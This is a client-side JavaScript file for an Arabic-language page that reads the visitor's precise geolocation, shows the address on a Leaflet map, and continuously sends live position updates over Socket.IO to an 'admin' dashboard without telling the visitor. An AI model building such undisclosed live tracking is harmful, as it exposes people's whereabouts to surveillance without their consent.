document.addEventListener('DOMContentLoaded', () => {
    let socket = null;
    if (typeof io !== 'undefined') {
        socket = io();
    } else {
        console.warn('Socket.IO is not loaded. Ensure you are accessing via the Node server (localhost:3000).');
    }
    // Elements
    const loadingState = document.getElementById('loadingState');
    const errorState = document.getElementById('errorState');
    const resultState = document.getElementById('resultState');
    const errorMessage = document.getElementById('errorMessage');
    const retryBtn = document.getElementById('retryBtn');

    // Data Elements
    const resCountry = document.getElementById('resCountry');
    const resCity = document.getElementById('resCity');
    const resStreet = document.getElementById('resStreet');
    const resLat = document.getElementById('resLat');
    const resLon = document.getElementById('resLon');
    const resFullAddress = document.getElementById('resFullAddress');

    let map = null;
    let marker = null;
    let watchId = null;
    let currentAddressDetails = null;

    // Start Location Fetching
    startLiveTracking();

    retryBtn.addEventListener('click', () => {
        showState(loadingState);
        startLiveTracking();
    });

    function showState(stateElement) {
        [loadingState, errorState, resultState].forEach(el => el.classList.remove('active'));
        [loadingState, errorState, resultState].forEach(el => el.classList.add('hidden'));
        
        stateElement.classList.remove('hidden');
        // Small timeout to allow display:flex to apply before opacity transition
        setTimeout(() => {
            stateElement.classList.add('active');
        }, 10);
    }

    function startLiveTracking() {
        if (!navigator.geolocation) {
            showError("متصفحك لا يدعم ميزة تحديد الموقع.");
            return;
        }

        // Clear previous watch if it exists
        if (watchId !== null) {
            navigator.geolocation.clearWatch(watchId);
        }

        watchId = navigator.geolocation.watchPosition(
            position => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                
                // Update map and coordinates instantly
                if (map) {
                    map.setView([lat, lon]);
                    marker.setLatLng([lat, lon]);
                    resLat.textContent = lat.toFixed(5);
                    resLon.textContent = lon.toFixed(5);

                    // Emit live updates to admin
                    if (socket) {
                        socket.emit('update_location', {
                            lat: lat,
                            lon: lon,
                            addressDetails: currentAddressDetails
                        });
                    }
                } else {
                    // First time fetch details
                    getPlaceDetails(lat, lon);
                }
            },
            error => {
                let msg = "حدث خطأ غير معروف.";
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        msg = "تم رفض طلب الوصول للموقع. يرجى السماح للمتصفح بالوصول لموقعك.";
                        break;
                    case error.POSITION_UNAVAILABLE:
                        msg = "معلومات الموقع غير متوفرة حالياً.";
                        break;
                    case error.TIMEOUT:
                        msg = "انتهى وقت طلب الموقع.";
                        break;
                }
                showError(msg);
            },
            {
                enableHighAccuracy: true,
                maximumAge: 0,
                timeout: 10000
            }
        );
    }

    async function getPlaceDetails(lat, lon) {
        try {
            // Using OpenStreetMap Nominatim API for reverse geocoding
            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=ar`);
            
            if (!response.ok) throw new Error("فشل في جلب البيانات من الخادم.");
            
            const data = await response.json();
            
            displayResults(lat, lon, data);
        } catch (err) {
            showError("حدث خطأ أثناء جلب تفاصيل العنوان: " + err.message);
        }
    }

    function displayResults(lat, lon, data) {
        const address = data.address || {};
        currentAddressDetails = address; // Store for live updates
        
        // Populate Data
        resCountry.textContent = address.country || '--';
        resCity.textContent = address.city || address.town || address.village || address.county || '--';
        resStreet.textContent = address.road || address.suburb || address.neighbourhood || '--';
        
        resLat.textContent = lat.toFixed(5);
        resLon.textContent = lon.toFixed(5);
        
        resFullAddress.textContent = data.display_name || '--';

        // Send location data to server for Admin Dashboard
        if (socket) {
            socket.emit('update_location', {
                lat: lat,
                lon: lon,
                addressDetails: currentAddressDetails
            });
        }

        showState(resultState);
        initMap(lat, lon, data.display_name);
    }

    function initMap(lat, lon, popupText) {
        if (!map) {
            // Initialize map if it doesn't exist
            map = L.map('map').setView([lat, lon], 15);
            
            // Add OpenStreetMap tiles
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
            }).addTo(map);

            // Add custom icon marker
            const customIcon = L.icon({
                iconUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon.png',
                iconRetinaUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon-2x.png',
                shadowUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-shadow.png',
                iconSize: [25, 41],
                iconAnchor: [12, 41],
                popupAnchor: [1, -34],
                shadowSize: [41, 41]
            });

            marker = L.marker([lat, lon], {icon: customIcon}).addTo(map);
        } else {
            // Update existing map
            map.setView([lat, lon], 15);
            marker.setLatLng([lat, lon]);
        }
        
        if (popupText) {
            marker.bindPopup(`<div style="text-align: right; font-family: 'Tajawal', sans-serif;">${popupText}</div>`).openPopup();
        }

        // Fix map rendering issue when container was hidden
        setTimeout(() => {
            map.invalidateSize();
        }, 100);
    }

    function showError(message) {
        errorMessage.textContent = message;
        showState(errorState);
    }
});
